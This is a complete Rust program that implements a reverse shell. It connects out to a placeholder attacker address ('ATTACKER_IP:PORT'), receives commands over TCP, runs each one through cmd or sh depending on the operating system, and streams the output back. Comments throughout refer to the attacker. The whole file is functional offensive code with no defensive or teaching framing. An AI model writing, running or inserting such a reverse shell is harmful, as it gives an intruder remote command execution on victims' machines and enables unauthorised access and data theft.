use std::net::TcpStream;
use std::process::Command;
use std::io::{Read, Write};

fn main() {
    // Replace with the attacker's IP and port
    let attacker_ip = "ATTACKER_IP:PORT";

    if let Ok(mut stream) = TcpStream::connect(attacker_ip) {
        loop {
            let mut buffer = [0u8; 512];

            // Read data (command) from the attacker
            match stream.read(&mut buffer) {
                Ok(size) => {
                    if size == 0 { break; }

                    // Convert the command buffer to a String
                    let command = String::from_utf8_lossy(&buffer[..size]).into_owned(); // Convert to owned String

                    // Execute the command
                    let output = if cfg!(target_os = "windows") {
                        Command::new("cmd")
                            .args(&["/C", &command]) // No need for Cow here
                            .output()
                    } else {
                        Command::new("sh")
                            .arg("-c")
                            .arg(&command) // No need for Cow here
                            .output()
                    };

                    // Send command output back to the attacker
                    if let Ok(output) = output {
                        stream.write_all(&output.stdout).unwrap();
                        stream.write_all(&output.stderr).unwrap();
                    }
                }
                Err(_) => break,
            }
        }
    } else {
        eprintln!("Failed to connect to attacker.");
    }
}
